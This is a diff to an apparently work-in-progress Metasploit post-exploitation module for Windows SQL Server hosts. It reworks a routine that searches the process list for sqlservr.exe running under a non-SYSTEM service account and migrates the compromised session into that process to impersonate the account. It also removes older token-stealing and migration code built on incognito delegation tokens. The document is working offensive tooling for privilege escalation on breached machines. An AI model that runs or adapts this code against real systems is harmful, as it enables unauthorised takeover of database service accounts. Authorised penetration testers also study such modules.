@@ -39,7 +39,8 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# TODO
-	# - fix - migrate wont rev2self...need to return back to system privs	
+	# - fix - migrate wont rev2self...need to return back to system 
+	#   privs, session dies after execution due to lack of privs - i think..	
 	# - fix - when not using incognito set token = false	
 	# - update verbose stuff	
 	# - test all fucntions on all version
@@ -402,139 +403,61 @@ class Metasploit3 < Msf::Post
 	
 	
 	## ----------------------------------------------
-	## Method for migrating to a process  - not used
-	##
-	## Note: Service users are differant with every
-	## version of sql server - using impersonation instead
-	## for sql server 2012, and localsystem for the rest
-	## also i cant rev2self after the migration
-	## without issues
-	## ----------------------------------------------
-	def migrate_to_process(service_instance,verbose)	
-		# Set current pid
-		mypid = session.sys.process.getpid
-		
-		# Set service name
-		service_name = "sqlservr.exe"
-		
-		# Set target user based on instance name
-		targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
-		
-		# Display settings in debug mode
-		print_status("Settings:") if verbose == "true"
-		print_status(" - Service name: #{service_name}") if verbose == "true"
-		print_status(" - Target user: #{targetuser}") if verbose == "true"
-		
-		# Loop throuh process list to find target SQL Server instance
-		session.sys.process.get_processes().each do |x|
-			if ( x['user'] == targetuser) then
-				print_good("SQL Server process found for instance: #{targetuser}")
-				print_status("Migrating into #{x['pid']}...")
-							
-				# Migrate to process
-				session.core.migrate(x['pid'].to_i)
-				print_good("Migration successful!!")
-				return 1
-			end
-		end
-		
-		# More fail
-		return 0
-	end
-	
-	
-	## ----------------------------------------------
 	## Method for impersonating sql server instance
-	##
-	## Note: most of this is from one of Jabras modules
 	## ----------------------------------------------
 	def impersonate_sql_user(service_instance,verbose)
 	
-		blah = session.sys.config.getuid # remove later
-		print_status("I AM #{blah}") # remove later
-	
-		print_status("Searching for sqlservr.exe processes not running as SYSTEM...")	
-
-		#define targetuser
+		# Print the current user
+		blah = session.sys.config.getuid if verbose == "true" 
+		print_status("Current user: #{blah}") if verbose == "true" 
+		
+		# Define target user/pid
 		targetuser = ""
 		targetpid = ""
-			
-		## Identify user running the SQL Server service process
+
+		# Identify SQL Server service processes
+		print_status("Searching for sqlservr.exe processes not running as SYSTEM...")
 		session.sys.process.get_processes().each do |x|
 		
 			# Search for all sqlservr.exe processes
-			if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")				
-				
-				# Look for target instance
+			if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")	
+			
+				# Found one
+				print_good("Found \"#{x['user']}\" running sqlservr.exe process #{x['pid']}") 
+						
+				# Define target pid / user
 				if x['user'] =~ /NT SERVICE/ then
-					if x['user'] == "NT SERVICE\\MSSQL$#{service_instance}" then
-						print_good("Found \"#{x['user']}\" running sqlservr.exe process") 
+					if x['user'] == "NT SERVICE\\MSSQL$#{service_instance}" then						 
 						targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
 						targetpid = x['pid'] 					
 					end
-				else 
+				else 					
 					targetuser = x['user']
 					targetpid = x['pid']
 				end
 			end
 		end
 	
+		# Attempt to migrate to target sqlservr.exe  process
 		if targetuser == "" then
-			#fail
-			print_error("Unabled to find process")
+			print_error("Unabled to find sqlservr.exe process not running as SYSTEM")
 			return 0
-		end
-
-		# Load incognito
-		print_status("Attempting to load incognito...")
-		session.core.use("incognito") if(! session.incognito)
-
-		if(! session.incognito)
-			print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
-			return 0
-		else
-			print_good("Sucessfully loaded incognito on #{session.sid} / #{session.session_host}")
-		
-			# Parse delegation tokens
-			print_status("Searching for deligation \"#{targetuser}\" token...")
-			res = session.incognito.incognito_list_tokens(0)
-			if res
-				res["delegation"].split("\n").each do |user|
-									
-					if targetuser == user						
-						print_good("Found deligation token: #{user}")						
-						print_status("Attempting to impersonate \"#{targetuser}\"...")						
-																				
-							#print_status("Stealing token of process ID #{targetpid}")							
-							#session.sys.config.steal_token(targetpid) # after this is set i cant getuid
-							
-							#print_status("Attempting to impersonate #{targetuser}")
-							#session.incognito.incognito_impersonate_token(domain_user)
-							#current_user = session.sys.config.getuid
-									
-							# Migrating works, but I cant do a rev 2 self
-							session.core.migrate(targetpid.to_i)
-							
-							blah = session.sys.config.getuid # remove later
-							print_status("I AM #{blah}") # remove later	
-							
-							#if current_user != targetuser
-								# print_error "Steal Token Failed)"
-							#	return 0
-							#else 
-								print_good("Successfully impersonated \"#{targetuser}\"")	
-								return 1
-							#end
-					else
-						print_error("Token not found")
-					end				
-				end
+		else 			
+			begin
+				# Migrating works, but I can't rev2self after its complete
+				print_status("Attempting to migrate to process #{targetpid}...")
+				session.core.migrate(targetpid.to_i)
+			
+				# Statusing
+				blah = session.sys.config.getuid if verbose == "true" 
+				print_status("Current user: #{blah}") if verbose == "true" 								
+				print_good("Successfully migrated to sqlservr.exe process #{targetpid}")
+				return 1
+			rescue
+				print_error("Unable to migrate to sqlservr.exe process #{targetpid}")
+				return 0			
 			end
-			# Fail
-			print_error("Deligation token not found for: #{targetuser}")
-			print_error("Failure complete.")
-			return 0
-		end				
+		end		
 	end	
 	
 	##
@@ -542,6 +465,7 @@ class Metasploit3 < Msf::Post
 	##
 	def givemesystem
 		
+		# Statusing
 		print_status("Checking if user is SYSTEM...")		
 		
 		# Check if user is system
